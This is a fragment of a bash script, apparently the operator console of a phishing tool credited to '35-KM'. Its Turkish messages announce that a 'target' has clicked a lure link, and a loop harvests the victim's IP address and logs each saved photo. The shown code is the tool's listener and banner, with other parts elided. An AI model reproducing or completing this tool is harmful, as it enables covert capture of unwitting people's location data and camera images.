...
banner() {
clear
printf "\e[1;92m  _____   ____            _  ____  __  \e[0m\n"
printf "\e[1;92m |___ /  | ___|          | |/ /  \/  | \e[0m\n"
printf "\e[1;92m   |_ \  |___ \   _____  | ' /| |\/| | \e[0m\n"
printf "\e[1;92m  ___) |  ___) | |_____| | . \| |  | | \e[0m\n"
printf "\e[1;92m |____/  |____/          |_|\_\_|  |_| \e[0m\n"

printf " \e[1;77m CODED BY 35-KM \e[0m \n"
...
printf "\n"
printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Hedef Bekleniyor... ,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
while [ true ]; do


if [[ -e "ip.txt" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] HEDEF LİNKE TIKLADI !\n"
catch_ip
rm -rf ip.txt
...
if [[ -e "Log.log" ]]; then
printf "\n\e[1;92m[\e[0m+\e[1;92m] FOTOĞRAF KAYDEDİLDİ... !\e[0m\n"
rm -rf Log.log
fi
sleep 0.5
